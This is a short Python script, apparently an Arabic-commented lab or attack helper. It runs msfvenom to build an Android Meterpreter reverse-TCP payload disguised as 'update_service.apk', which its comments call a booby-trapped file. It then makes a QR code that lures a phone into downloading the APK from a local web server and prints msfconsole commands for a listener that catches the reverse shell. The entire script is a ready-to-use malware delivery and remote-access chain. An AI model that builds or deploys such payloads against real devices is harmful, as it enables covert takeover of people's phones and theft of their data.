import os
import qrcode

def setup_environment():
    # الأي بي الجديد الخاص بك
    ip = "10.100.84.123" 
    port = "4444"
    filename = "update_service.apk"
    
    print(f"--- [ Using Updated Kali IP: {ip} ] ---")
    
    # 1. إنشاء البيلود (الملف الملغوم)
    print(f"\n[+] Generating Payload: {filename}...")
    cmd_payload = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {filename}"
    os.system(cmd_payload)
    
    # 2. إنشاء الباركود (QR Code)
    print(f"[+] Creating QR Code...")
    link = f"http://{ip}:8000/{filename}"
    qr = qrcode.make(link)
    qr.save("connect.png")
    
    # 3. عرض تعليمات التشغيل الدقيقة
    print("-" * 55)
    print(f"DONE! Scan 'connect.png' with your phone.")
    print("-" * 55)
    print("\n[!] FOLLOW THESE STEPS IN ORDER:")
    print(f"STEP 1: Open a terminal and run the server:")
    print(f"   python3 -m http.server 8000")
    print(f"\nSTEP 2: Open another terminal and run Metasploit:")
    print(f"   msfconsole -q -x \"use exploit/multi/handler; "
          f"set payload android/meterpreter/reverse_tcp; "
          f"set LHOST {ip}; "
          f"set LPORT {port}; "
          f"exploit\"")
    print("-" * 55)
    
    # فتح صورة الباركود
    if os.path.exists("connect.png"):
        os.system("xdg-open connect.png")

if __name__ == "__main__":
    setup_environment()
